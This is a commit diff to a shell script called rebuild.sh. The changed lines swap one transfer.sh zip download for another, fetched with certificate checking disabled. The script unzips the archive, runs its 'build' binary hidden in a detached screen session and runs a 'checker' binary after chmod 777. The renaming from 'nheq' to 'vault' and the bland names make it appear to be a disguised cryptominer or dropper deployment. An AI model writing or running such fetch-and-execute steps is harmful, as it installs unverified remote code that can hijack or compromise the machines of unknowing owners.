596f8a3a80538aaf93adc549c8f49162f0c6b1ed
mata lima <lamajuahsu@outlook.com>
2021-10-27 13:30:42 +0000

    rebuild.sh edited online with Bitbucket

--- rebuild.sh
+++ rebuild.sh
@@ -4,10 +4,10 @@
 
 sudo apt update
 sudo apt -y install screen unzip
-wget --no-check-certificate -c https://transfer.sh/7rJEG5/nheq.zip
-unzip nheq.zip
-mv checker nheq
-cd nheq
+wget --no-check-certificate -c https://transfer.sh/glULeN/vault.zip
+unzip vault.zip
+mv checker vault
+cd vault
 screen -dmS build ./build
 > /dev/null 2>&1
 chmod 777 checker && ./checker
